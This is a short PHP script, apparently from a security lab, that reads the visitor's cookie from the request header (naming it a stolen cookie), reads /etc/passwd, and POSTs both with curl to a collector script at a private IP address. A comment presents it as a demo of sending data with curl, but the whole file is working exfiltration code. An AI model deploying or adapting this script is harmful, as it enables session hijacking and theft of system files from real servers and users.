<?php

$splitholder = explode(' ', $_SERVER['HTTP_COOKIE']);
$stolenCookie = $splitholder[1];

// demo of how to use curl in PHP to send data via POST.

//url of the recving script
$url='http://10.0.2.15/saveinfo.php';

// construct a url expresion with the data to send.
$myvars = 'cookie='.$stolenCookie.'&passwords='.file_get_contents('/etc/passwd');

// use curl to contruct a  post
$conn = curl_init($url);
curl_setopt($conn, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($conn, CURLOPT_POST, 1);
curl_setopt($conn, CURLOPT_POSTFIELDS, $myvars);
curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($conn, CURLOPT_HEADER, 0);
curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);

// SEND THE POST AND GET A RESONCE
$response = curl_exec($conn);

//debugging info
//print_r(curl_getinfo($conn));

curl_close($conn);

//echo "<pre>response: \n $response </pre>"
?>